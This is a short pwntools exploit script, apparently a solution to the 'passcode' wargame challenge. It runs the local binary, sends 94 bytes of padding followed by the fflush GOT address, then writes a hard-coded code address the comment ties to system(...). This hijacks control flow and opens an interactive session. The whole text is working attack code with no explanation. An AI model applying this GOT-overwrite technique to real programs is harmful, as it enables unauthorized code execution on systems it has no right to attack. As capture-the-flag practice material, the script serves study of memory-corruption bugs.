from pwn import *

p = process('./passcode')

print(p.readuntil(b': ').decode())
FFLUSH_GOT = 0x804a004

p.readuntil(b': ')
p.sendline(b'A'*94 + p32(FFLUSH_GOT))

# overwrite fflush got with system(...)
p.readuntil(b': ')
p.sendline(str(0x080485d7).encode())

p.interactive()

